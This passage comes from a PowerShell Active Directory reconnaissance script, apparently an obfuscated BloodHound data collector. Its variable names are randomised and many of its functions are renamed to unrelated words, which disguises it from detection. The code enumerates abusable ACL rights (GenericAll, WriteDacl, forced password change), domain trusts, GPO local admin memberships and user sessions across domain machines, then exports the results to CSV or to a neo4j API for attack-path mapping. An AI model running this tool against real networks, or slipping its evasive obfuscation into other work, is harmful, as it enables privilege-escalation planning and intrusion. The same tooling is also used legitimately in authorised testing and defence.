                        $fYBoZBzg99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                        try {
                            New-Object -TypeName Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | Select-Object -Expand DiscretionaryAcl | ForEach-Object {
                                $zIszBVLm99 += 1
                                if($zIszBVLm99 % 10000 -eq 0) {
                                    Write-Verbose "ACE counter: $zIszBVLm99"
                                    if($qQMJXXXe99) {
                                        $qQMJXXXe99.Flush()
                                    }
                                    [GC]::Collect()
                                }
                                $nOflKoeM99 = ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                                if (
                                        ( ($nOflKoeM99 -match 'GenericAll|GenericWrite') -and (-not $_.ObjectAceType -or $_.ObjectAceType -eq '00000000-0000-0000-0000-000000000000') ) -or 
                                        ($nOflKoeM99 -match 'WriteDacl|WriteOwner') -or 
                                        ( ($nOflKoeM99 -match 'ExtendedRight') -and (-not $_.ObjectAceType -or $_.ObjectAceType -eq '00000000-0000-0000-0000-000000000000') ) -or 
                                        (($_.ObjectAceType -eq '00299570-246d-11d0-a768-00aa006e0529') -and ($nOflKoeM99 -match 'ExtendedRight')) -or
                                        (($_.ObjectAceType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2') -and ($nOflKoeM99 -match 'WriteProperty')) -or
                                        (($_.ObjectAceType -eq 'bf9679a8-0de6-11d0-a285-00aa003049e2') -and ($nOflKoeM99 -match 'WriteProperty'))
                                    ) {
                                    
                                    $IWsFADPu99 = $_.SecurityIdentifier.ToString()
                                    $TLkDLFqc99, $FIeGozvz99, $ZKNOOKwa99 = $Null
                                    $xSoThHnt99 = $pApFYtZu99.Matches($nOflKoeM99) | Select-Object -ExpandProperty Value
                                    if (-not $xSoThHnt99) {
                                        if ($nOflKoeM99 -match 'ExtendedRight') {
                                            $xSoThHnt99 = 'ExtendedRight'
                                        }
                                        else {
                                            $xSoThHnt99 = 'WriteProperty'
                                        }
                                        $ZKNOOKwa99 = Switch ($_.ObjectAceType) {
                                            '00299570-246d-11d0-a768-00aa006e0529' {'User-Force-Change-Password'}
                                            'bf9679c0-0de6-11d0-a285-00aa003049e2' {'Member'}
                                            'bf9679a8-0de6-11d0-a285-00aa003049e2' {'Script-Path'}
                                            Default {'All'}
                                        }
                                    }
                                    if ($DPxLiZjT99[$IWsFADPu99]) {
                                        $TLkDLFqc99, $FIeGozvz99 = $DPxLiZjT99[$IWsFADPu99]
                                    }
                                    elseif ($oqdcqDSq99[$IWsFADPu99]) {
                                        $lLMPutxb99, $FIeGozvz99 = $oqdcqDSq99[$IWsFADPu99]
                                        $TLkDLFqc99 = "$lLMPutxb99@$kURivMze99"
                                        $DPxLiZjT99[$IWsFADPu99] = $TLkDLFqc99, $FIeGozvz99
                                    }
                                    else {
                                        $sOllUamv99 = Get-DomainSearcher -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99
                                        $sOllUamv99.PropertiesToLoad.AddRange(('samaccountname','distinguishedname','dnshostname','objectclass'))
                                        $sOllUamv99.Filter = "(objectsid=$IWsFADPu99)"
                                        $RDGIMjTJ99 = $sOllUamv99.FindOne()
                                        if ((-not $RDGIMjTJ99) -and ((-not $wjlQGPFM99) -or (-not $wjlQGPFM99.StartsWith('GC:')))) {
                                            $TfNdDMLq99 = Get-DomainSearcher -CDwHFsqK99 $nTQidLJa99
                                            $TfNdDMLq99.PropertiesToLoad.AddRange(('samaccountname','distinguishedname','dnshostname','objectclass'))
                                            $TfNdDMLq99.Filter = "(objectsid=$IWsFADPu99)"
                                            $RDGIMjTJ99 = $TfNdDMLq99.FindOne()
                                        }
                                        if ($RDGIMjTJ99) {
                                            if ($RDGIMjTJ99.Properties.objectclass.contains('computer')) {
                                                $FIeGozvz99 = 'COMPUTER'
                                                $TLkDLFqc99 = $RDGIMjTJ99.Properties.dnshostname[0]
                                            }
                                            else {
                                                $ftBhESjR99 = $RDGIMjTJ99.Properties.samaccountname[0]
                                                $uCLxqXmi99 = $RDGIMjTJ99.Properties.distinguishedname[0]
                                                $fwUNPtTQ99 = $uCLxqXmi99.SubString($uCLxqXmi99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $TLkDLFqc99 = "$ftBhESjR99@$fwUNPtTQ99"
                                                if ($RDGIMjTJ99.Properties.objectclass.contains('group')) {
                                                    $FIeGozvz99 = 'GROUP'
                                                }
                                                elseif ($RDGIMjTJ99.Properties.objectclass.contains('user')) {
                                                    $FIeGozvz99 = 'USER'
                                                }
                                                else {
                                                    $FIeGozvz99 = 'OTHER'
                                                }
                                            }
                                        }
                                        else {
                                            Write-Verbose "SID not resolved: $IWsFADPu99"
                                        }
                                        $DPxLiZjT99[$IWsFADPu99] = $TLkDLFqc99, $FIeGozvz99
                                    }
                                    if ($TLkDLFqc99 -and $FIeGozvz99) {
                                        $QdVkYekP99, $PDbcMcAN99 = $Null
                                        if ($Object.objectclass.contains('computer')) {
                                            $PDbcMcAN99 = 'COMPUTER'
                                            if ($Object.dnshostname) {
                                                $QdVkYekP99 = $Object.dnshostname[0]
                                            }
                                        }
                                        else {
                                            if($Object.samaccountname) {
                                                $SgEckLeD99 = $Object.samaccountname[0]
                                            }
                                            else {
                                                $SgEckLeD99 = $Object.name[0]
                                            }
                                            $DN = $Object.distinguishedname[0]
                                            $RGaQlTIC99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                            $QdVkYekP99 = "$SgEckLeD99@$RGaQlTIC99"
                                            if ($Object.objectclass.contains('group')) {
                                                $PDbcMcAN99 = 'GROUP'
                                            }
                                            elseif ($Object.objectclass.contains('user')) {
                                                $PDbcMcAN99 = 'USER'
                                            }
                                            else {
                                                $PDbcMcAN99 = 'OTHER'
                                            }
                                        }
                                        if ($QdVkYekP99 -and $PDbcMcAN99) {
                                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                                $qQMJXXXe99.WriteLine("`"$QdVkYekP99`",`"$PDbcMcAN99`",`"$TLkDLFqc99`",`"$FIeGozvz99`",`"$xSoThHnt99`",`"$ZKNOOKwa99`",`"$($_.AceQualifier)`",`"$($_.IsInherited)`"")
                                            }
                                            else {
                                                Write-Warning 'TODO: implement neo4j RESTful API ingestion for ACLs!'
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch {
                            Write-Verbose "ACL ingestion error: $_"
                        }
                    }
                }
            }
        }
        if($AEzEAMYx99 -and $imELBFNB99) {
            Write-Verbose "Mapping domain trusts"
            granularity | ForEach-Object {
                if($_.SourceDomain) {
                    $RPNizsdw99 = $_.SourceDomain
                }
                else {
                    $RPNizsdw99 = $_.SourceName
                }
                if($_.TargetDomain) {
                    $kURivMze99 = $_.TargetDomain
                }
                else {
                    $kURivMze99 = $_.TargetName
                }
                if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                    $KjKeMftM99.WriteLine("`"$RPNizsdw99`",`"$kURivMze99`",`"$($_.TrustDirection)`",`"$($_.TrustType)`",`"$True`"")
                }
                else {
                    $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE (SourceDomain:Domain { name: UPPER('$RPNizsdw99') }) MERGE (TargetDomain:Domain { name: UPPER('$kURivMze99') })" } )
                    $gCjYxMfT99 = $_.TrustType
                    $HQZyVSks99 = $True
                    Switch ($_.TrustDirection) {
                        'Inbound' {
                             $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE (SourceDomain)-[:TrustedBy{ TrustType: UPPER('$gCjYxMfT99'), Transitive: UPPER('$HQZyVSks99')}]->(TargetDomain)" } )
                        }
                        'Outbound' {
                             $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE (TargetDomain)-[:TrustedBy{ TrustType: UPPER('$gCjYxMfT99'), Transitive: UPPER('$HQZyVSks99')}]->(SourceDomain)" } )
                        }
                        'Bidirectional' {
                             $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE (TargetDomain)-[:TrustedBy{ TrustType: UPPER('$gCjYxMfT99'), Transitive: UPPER('$HQZyVSks99')}]->(SourceDomain) MERGE (SourceDomain)-[:TrustedBy{ TrustType: UPPER('$gCjYxMfT99'), Transitive: UPPER('$HQZyVSks99')}]->(TargetDomain)" } )
                        }
                    }
                }
            }
            if ($PSCmdlet.ParameterSetName -eq 'RESTAPI') {
                $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
                $fhjNEnHI99 = ConvertTo-Json20 $Json
                $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
                $JQyzEjrC99.Clear()
            }
            Write-Verbose "Done mapping domain trusts"
        }
        if($vIJxobkX99 -and $imELBFNB99) {
            ForEach ($kURivMze99 in $imELBFNB99) {
                Write-Verbose "Enumerating GPO local group memberships for domain $kURivMze99"
                taillights -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99 | ForEach-Object {
                    $VTKhDYFX99 = "$($_.ObjectName)@$($_.ObjectDomain)"
                    ForEach($cAqMfgab99 in $_.ComputerName) {
                        if($_.IsGroup) {
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $iankojIc99.WriteLine("`"$cAqMfgab99`",`"$VTKhDYFX99`",`"group`"")
                            }
                            else {
                                $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (group:Group { name: UPPER('$VTKhDYFX99') }) MERGE (computer:Computer { name: UPPER('$cAqMfgab99') }) MERGE (group)-[:AdminTo]->(computer)" } )
                            }
                        }
                        else {
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $iankojIc99.WriteLine("`"$cAqMfgab99`",`"$VTKhDYFX99`",`"user`"")
                            }
                            else {
                                $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$VTKhDYFX99') }) MERGE (computer:Computer { name: UPPER('$cAqMfgab99') }) MERGE (user)-[:AdminTo]->(computer)" } )
                            }
                        }
                    }
                }
                Write-Verbose "Done enumerating GPO local group memberships for domain $kURivMze99"
            }
            Write-Verbose "Done enumerating GPO local group"
        }
        $cKvdxmQv99 = ([Environment]::UserName).toLower()
        $YAjkINiU99 = {
            Param($FSUaYgqW99, $kPCtDGXC99, $ECZpErEG99, $ERReedPW99, $nVaoVZwP99, $lwCElfTw99)
            ForEach ($sZFoptHY99 in $FSUaYgqW99) {
                $Up = Test-Connection -Count 1 -Quiet -FSUaYgqW99 $sZFoptHY99
                if($Up) {
                    if($ECZpErEG99) {
                        $WrHBfuOI99 = Somalia -FSUaYgqW99 $sZFoptHY99 -API -DbAVTovZ99 -pRsTGpGl99 $lwCElfTw99
                        if($WrHBfuOI99) {
                            $WrHBfuOI99
                        }
                        else {
                            Somalia -FSUaYgqW99 $sZFoptHY99 -DbAVTovZ99 -pRsTGpGl99 $lwCElfTw99
                        }
                    }
                    $HziCZkUq99 = @(Get-IPAddress -FSUaYgqW99 $sZFoptHY99)[0].IPAddress
                    if($ERReedPW99) {
                        ForEach ($fOPRzDJI99 in $(Get-NetSession -FSUaYgqW99 $sZFoptHY99)) {
                            $QEbKYtQz99 = $fOPRzDJI99.sesi10_username
                            $CName = $fOPRzDJI99.sesi10_cname
                            if($CName -and $CName.StartsWith("\\")) {
                                $CName = $CName.TrimStart("\")
                            }
                            if (($QEbKYtQz99) -and ($QEbKYtQz99.trim() -ne '') -and ($QEbKYtQz99 -notmatch '\$') -and ($QEbKYtQz99 -notmatch $kPCtDGXC99)) {
                                try {
                                    $bmhpTCYu99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                }
                                catch {
                                    $bmhpTCYu99 = $CName
                                }
                                @{
                                    'UserDomain' = $Null
                                    'UserName' = $QEbKYtQz99
                                    'ComputerName' = $sZFoptHY99
                                    'IPAddress' = $HziCZkUq99
                                    'SessionFrom' = $CName
                                    'SessionFromName' = $bmhpTCYu99
                                    'LocalAdmin' = $Null
                                    'Type' = 'UserSession'
                                }
                            }
                        }
                    }
                    if($nVaoVZwP99) {
                        ForEach ($User in $(Get-NetLoggedon -FSUaYgqW99 $sZFoptHY99)) {
                            $QEbKYtQz99 = $User.wkui1_username
                            $VqGWUmua99 = $User.wkui1_logon_domain
                            if($sZFoptHY99 -notmatch "^$VqGWUmua99") {
                                if (($QEbKYtQz99) -and ($QEbKYtQz99.trim() -ne '') -and ($QEbKYtQz99 -notmatch '\$')) {
                                    @{
                                        'UserDomain' = $VqGWUmua99
                                        'UserName' = $QEbKYtQz99
                                        'ComputerName' = $sZFoptHY99
                                        'IPAddress' = $HziCZkUq99
                                        'SessionFrom' = $Null
                                        'SessionFromName' = $Null
                                        'LocalAdmin' = $Null
                                        'Type' = 'UserSession'
                                    }
                                }
                            }
                        }
                        ForEach ($User in $(Get-LoggedOnLocal -FSUaYgqW99 $sZFoptHY99)) {
                            $QEbKYtQz99 = $User.UserName
                            $VqGWUmua99 = $User.UserDomain
                            if($sZFoptHY99 -notmatch "^$VqGWUmua99") {
                                @{
                                    'UserDomain' = $VqGWUmua99
                                    'UserName' = $QEbKYtQz99
                                    'ComputerName' = $sZFoptHY99
                                    'IPAddress' = $HziCZkUq99
                                    'SessionFrom' = $Null
                                    'SessionFromName' = $Null
                                    'LocalAdmin' = $Null
                                    'Type' = 'UserSession'
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($imELBFNB99 -and (-not $NfoKTnNS99)) {
            
            if($JQyzEjrC99) {
                $JQyzEjrC99.Clear()
            }
            [Array]$WmxVPkXM99 = @()
            ForEach ($kURivMze99 in $imELBFNB99) {
                $pRsTGpGl99 = Get-DomainSid -qgkPCptv99 $kURivMze99
                $FlXeKwGl99 = @{
                    'CurrentUser2' = $cKvdxmQv99
                    'UseLocalGroup2' = $yDvlFBRs99
                    'UseSession2' = $CcJrXQJG99
                    'UseLoggedon2' = $xeHUrlzx99
                    'DomainSID2' = $pRsTGpGl99
                }
                if($FGOSfzyC99 -eq 'Stealth') {
                    Write-Verbose "Executing stealth computer enumeration of domain $kURivMze99"
                    Write-Verbose "Querying domain $kURivMze99 for File Servers"
                    $WmxVPkXM99 += subjugated -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99
                    Write-Verbose "Querying domain $kURivMze99 for DFS Servers"
                    $WmxVPkXM99 += ForEach($PtPiFDOO99 in $(blogs -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99)) {
                        $PtPiFDOO99.RemoteServerName
                    }
                    Write-Verbose "Querying domain $kURivMze99 for Domain Controllers"
                    $WmxVPkXM99 += ForEach($wjlQGPFM99 in $(Get-NetDomainController -LDAP -wjlQGPFM99 $wjlQGPFM99 -qgkPCptv99 $kURivMze99)) {
                        $wjlQGPFM99.dnshostname
                    }
                    $WmxVPkXM99 = $WmxVPkXM99 | Where-Object {$_ -and ($_.Trim() -ne '')} | Sort-Object -Unique
                }
                else {
                    if($FSUaYgqW99) {
                        Write-Verbose "Using specified -FSUaYgqW99 target set"
                        if($FSUaYgqW99 -isnot [System.Array]) {$FSUaYgqW99 = @($FSUaYgqW99)}
                        $WmxVPkXM99 = $FSUaYgqW99
                    }
                    else {
                        Write-Verbose "Enumerating all machines in domain $kURivMze99"
                        $WlGHjFTW99 = Get-DomainSearcher -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99 -ADSPath $DdOkjwsE99
                        $WlGHjFTW99.filter = '(sAMAccountType=805306369)'
                        $Null = $WlGHjFTW99.PropertiesToLoad.Add('dnshostname')
                        $WmxVPkXM99 = $WlGHjFTW99.FindAll() | ForEach-Object {$_.Properties.dnshostname}
                        $WlGHjFTW99.Dispose()
                    }
                }
                $WmxVPkXM99 = $WmxVPkXM99 | Where-Object { $_ }
                incorrigibility -FSUaYgqW99 $WmxVPkXM99 -ycQbSkaw99 $YAjkINiU99 -FlXeKwGl99 $FlXeKwGl99 -TGesMuqZ99 $TGesMuqZ99 | ForEach-Object {
                    if($_['Type'] -eq 'UserSession') {
                        if($_['SessionFromName']) {
                            try {
                                $sEVKXOsA99 = $_['SessionFromName']
                                $QEbKYtQz99 = $_['UserName'].ToUpper()
                                $UOlzdtKs99 = $_['SessionFromName'].SubString($_['SessionFromName'].IndexOf('.')+1).ToUpper()
                                if($taCxAoHP99) {
                                    $VqGWUmua99 = $Null
                                    if($taCxAoHP99[$QEbKYtQz99]) {
                                        if($taCxAoHP99[$QEbKYtQz99].Count -eq 1) {
                                            $VqGWUmua99 = $taCxAoHP99[$QEbKYtQz99]
                                            $fEvICmMV99 = "$QEbKYtQz99@$VqGWUmua99"
                                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                                $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"1`"")
                                            }
                                            else {
                                                $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$fEvICmMV99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                            }
                                        }
                                        else {
                                            $UOlzdtKs99 = $_['SessionFromName'].SubString($_['SessionFromName'].IndexOf('.')+1).ToUpper()
                                            $taCxAoHP99[$QEbKYtQz99] | ForEach-Object {
                                                if($_ -eq $UOlzdtKs99) {
                                                    $VqGWUmua99 = $_
                                                    $fEvICmMV99 = "$QEbKYtQz99@$VqGWUmua99"
                                                    if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                                        $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"1`"")
                                                    }
                                                    else {
                                                        $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$fEvICmMV99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                                    }
                                                }
                                                else {
                                                    $VqGWUmua99 = $_
                                                    $fEvICmMV99 = "$QEbKYtQz99@$VqGWUmua99"
                                                    if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                                        $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"2`"")
                                                    }
                                                    else {
                                                        $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$fEvICmMV99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)" } )
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    else {
                                        $fEvICmMV99 = "$QEbKYtQz99@UNKNOWN"
                                        if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                            $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"2`"")
                                        }
                                        else {
                                            $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$fEvICmMV99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)" } )
                                        }
                                    }
                                }
                                else {
                                    $fEvICmMV99 = "$QEbKYtQz99@$UOlzdtKs99"
                                    if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                        $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"2`"")
                                    }
                                    else {
                                        $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$fEvICmMV99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)"} )
                                    }
                                }
                            }
                            catch {
                                Write-Warning "Error extracting domain from $sEVKXOsA99"
                            }
                        }
                        elseif($_['SessionFrom']) {
                            $sEVKXOsA99 = $_['SessionFrom']
                            $fEvICmMV99 = "$($_['UserName'])@UNKNOWN"
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$fEvICmMV99`",`"2`"")
                            }
                            else {
                                $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER(`"$fEvICmMV99`") }) MERGE (computer:Computer { name: UPPER(`"$sEVKXOsA99`") }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)"} )
                            }
                        }
                        else {
                            $VqGWUmua99 = $_['UserDomain']
                            $QEbKYtQz99 = $_['UserName']
                            try {
                                if($hSbhhSWE99[$VqGWUmua99]) {
                                    $VTKhDYFX99 = "$QEbKYtQz99@$($hSbhhSWE99[$VqGWUmua99])"
                                }
                                else {
                                    $LJazVNhO99 = "$VqGWUmua99\$QEbKYtQz99" | Convert-ADName -QwuuysVC99 'NT4' -bevdxAcf99 'Canonical'
                                    if($LJazVNhO99) {
                                        $DWQsVkvv99 = $LJazVNhO99.Split('/')[0]
                                        $VTKhDYFX99 = "$QEbKYtQz99@$DWQsVkvv99"
                                        $hSbhhSWE99[$VqGWUmua99] = $DWQsVkvv99
                                    }
                                    else {
                                        $VTKhDYFX99 = "$QEbKYtQz99@UNKNOWN"
                                    }
                                }
                                $sEVKXOsA99 = $_['ComputerName']
                                if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                    $LKWbVgMX99.WriteLine("`"$sEVKXOsA99`",`"$VTKhDYFX99`",`"1`"")
                                }
                                else {
                                    $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$VTKhDYFX99') }) MERGE (computer:Computer { name: UPPER('$sEVKXOsA99') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                }
                            }
                            catch {
                                Write-Verbose "Error converting $VqGWUmua99\$QEbKYtQz99 : $_"
                            }
                        }
                    }
                    elseif($_['Type'] -eq 'LocalUser') {
                        $Parts = $_['AccountName'].split('\')
                        $VqGWUmua99 = $Parts[0]
                        $QEbKYtQz99 = $Parts[-1]
                        if($hSbhhSWE99[$VqGWUmua99]) {
                            $VTKhDYFX99 = "$QEbKYtQz99@$($hSbhhSWE99[$VqGWUmua99])"
                        }
                        else {
                            $LJazVNhO99 = "$VqGWUmua99\$QEbKYtQz99" | Convert-ADName -QwuuysVC99 'NT4' -bevdxAcf99 'Canonical'
                            if($LJazVNhO99) {
                                $DWQsVkvv99 = $LJazVNhO99.Split('/')[0]
                                $VTKhDYFX99 = "$QEbKYtQz99@$DWQsVkvv99"
                                $hSbhhSWE99[$VqGWUmua99] = $DWQsVkvv99
                            }
                            else {
                                $VTKhDYFX99 = "$QEbKYtQz99@UNKNOWN"
                            }
                        }
                        $FSUaYgqW99 = $_['ComputerName']
                        if($_['IsGroup']) {
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $iankojIc99.WriteLine("`"$FSUaYgqW99`",`"$VTKhDYFX99`",`"group`"")
                            }
                            else {
                                $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE (group:Group { name: UPPER('$VTKhDYFX99') }) MERGE (computer:Computer { name: UPPER('$FSUaYgqW99') }) MERGE (group)-[:AdminTo]->(computer)" } )
                            }
                        }
                        else {
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $iankojIc99.WriteLine("`"$FSUaYgqW99`",`"$VTKhDYFX99`",`"user`"")
                            }
                            else {
                                $Null = $JQyzEjrC99.Add( @{"statement"="MERGE (user:User { name: UPPER('$VTKhDYFX99') }) MERGE (computer:Computer { name: UPPER('$FSUaYgqW99') }) MERGE (user)-[:AdminTo]->(computer)" } )
                            }
                        }
                    }
                    if (($PSCmdlet.ParameterSetName -eq 'RESTAPI') -and ($JQyzEjrC99.Count -ge $jHfLbtar99)) {
                        $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
                        $fhjNEnHI99 = ConvertTo-Json20 $Json
                        $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
                        $JQyzEjrC99.Clear()
                        [GC]::Collect()
                    }
                }
            }
        }
    }
    END {
        if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
            if($LKWbVgMX99) {
                $LKWbVgMX99.Dispose()
                $DyMwSxWA99.Dispose()
            }
            if($McCHcUCv99) {
                $McCHcUCv99.Dispose()
                $FvUkJJcN99.Dispose()
            }
            if($qQMJXXXe99) {
                $qQMJXXXe99.Dispose()
                $fQzBVRzW99.Dispose()
            }
            if($iankojIc99) {
                $iankojIc99.Dispose()
                $kmPvvzMP99.Dispose()
            }
            if($KjKeMftM99) {
                $KjKeMftM99.Dispose()
                $haotgUaW99.Dispose()
            }
            Write-Output "Done writing output to CSVs in: $MCisMCsJ99\$MqlzohSk99"
        }
        else {
           $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
           $fhjNEnHI99 = ConvertTo-Json20 $Json
           $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
           $JQyzEjrC99.Clear()
           Write-Output "Done sending output to neo4j RESTful API interface at: $($URI.AbsoluteUri)"
        }
        [GC]::Collect()
    }
}
$Mod = pap -ModuleName Win32
$FunctionDefinitions = @(
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError)
)
$JEyXbLas99 = Brillo $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}
$zQxgyCSB99 = Brillo $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}
$gGKKCYKR99 = misappropriation $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$nBpBZvrp99 = Brillo $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $gGKKCYKR99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = misappropriation $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$vGjgWZny99 = misappropriation $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$KZsOgHQx99 = misappropriation $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$CVZqaIGQ99 = Brillo $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $vGjgWZny99
    TrustAttributes = field 5 $KZsOgHQx99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$Types = $FunctionDefinitions | Abel -Module $Mod -Namespace 'Win32'
$xLwRIgua99 = $Types['netapi32']
$dEEPHqLA99 = $Types['advapi32']
Set-Alias Get-BloodHoundData grimacing
